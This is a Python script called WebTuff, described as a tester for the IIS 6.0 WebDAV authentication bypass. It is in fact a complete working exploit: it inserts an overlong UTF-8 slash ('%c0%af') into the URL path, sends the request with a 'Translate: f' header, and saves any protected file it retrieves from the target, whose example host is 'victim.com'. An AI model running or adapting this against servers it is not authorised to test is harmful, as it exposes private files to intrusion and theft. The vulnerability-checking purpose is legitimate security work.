#!/usr/bin/env python
"""
    WebTuff v1.0
    Copyright 2009, Raviv Raz - ravivr@gmail.com
    WebTuff is distributed under the terms of the GNU General Public License
    WebTuff is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
from sys import argv
from urlparse import urlparse
from cStringIO import StringIO
import httplib
headers = {"Translate":"f","Connection":"close"}
def usage():
    print ""
    print "Copyright 2009-2011, Raviv Raz - ravivr@gmail.com"
    print "WebTuff is a testing utility that verifies"
    print "whether your IIS server is vulnerable to"
    print "Microsoft IIS 6.0\nWebDAV Remote Authentication Bypass"
    print "In a successful breach, WebTuff saves the"
    print "remote resource locally under the same name"
    print "\nUsage: %s <url to web directory>\nFor example: %s http://www.victim.com/path/to/file.txt"%(argv[0],argv[0])
    raw_input()
    raise SystemExit

def obfuscate(url):
    path = urlparse(url)[2]
    obfuscated = path[0:len(path)/2]+"%c0%af"+path[len(path)/2:]
    newUrl = url.replace(path,obfuscated)
    return newUrl

def main():
    try:
        originalUrl = str(argv[1])
        hostname = urlparse(originalUrl)[1]
        filename = originalUrl[originalUrl.rfind("/")+1:]
    except:
        usage()
    obUrl = obfuscate(originalUrl)
    print "[!] Attempting to connect to: %s"%originalUrl
    try:
        conn = httplib.HTTPConnection(hostname)
        conn.request( "GET", urlparse(originalUrl)[2],None,headers )
        response = conn.getresponse()
        if response.status == 404:
            print "[x] Resource was not found on the server."
        elif response.status == 401:
            print "[x] Request denied by IIS authentication. Good."
        elif response.status == 200:
            print "[v] Resource was retrieved without any authentication! You must apply ACL to web folders."
        print "[!] Proceeding with URL obfuscation:",obUrl
        conn = httplib.HTTPConnection(hostname)
        conn.request( "GET", urlparse(obUrl)[2],None,headers )
        response = conn.getresponse()
        if response.status == 404:
            print "[x] Resource was not found on the server."
        elif response.status == 401:
            print "[x] Request still denied by IIS authentication. You are protected against this attack."
        elif response.status == 200:
            print "[v] URL Obfuscation attack succeeded! You must apply security to IIS immediately."
            print "[v] The contents of this resource have been saved into: %s\n"%filename
            data = StringIO(response.read())
            output = open(filename,"wb")
            output.write(data.read())
            output.close()
    except:
        print "[x] Connection failed. Breaking connection"
        conn.close()
        raise SystemExit

if __name__ == "__main__":
    main()

